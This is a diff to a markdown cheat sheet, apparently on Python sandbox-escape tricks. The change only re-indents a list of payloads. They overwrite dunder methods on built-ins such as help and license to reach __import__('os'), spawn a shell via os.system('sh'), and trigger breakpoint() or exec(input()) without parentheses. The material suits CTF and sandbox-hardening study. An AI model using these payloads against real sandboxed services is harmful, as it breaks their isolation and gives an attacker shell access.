@@ -23,10 +23,10 @@ Use Unicode characters that look like ASCII but bypass filters. See [details](./
 
 ### Function Calls Without Parentheses
 - **`__import__('os')` alternatives:**
-  - `help.__class__.__getitem__ = __import__;help['os']`
-  - `help.__class__.__contains__ = __import__('os').system;'sh' in help`
-  - `ExceptionGroup.__class_getitem__ = __import__; ExceptionGroup["os"]`
-  - `help.__class__.__getattr__ = __import__; help.os`
+    - `help.__class__.__getitem__ = __import__;help['os']`
+    - `help.__class__.__contains__ = __import__('os').system;'sh' in help`
+    - `ExceptionGroup.__class_getitem__ = __import__; ExceptionGroup["os"]`
+    - `help.__class__.__getattr__ = __import__; help.os`
 - **`breakpoint()`:** `license._Printer__setup = breakpoint; str(license)`
 - **`exec(input())`:** `@exec\n@input\nclass a: pass`
 
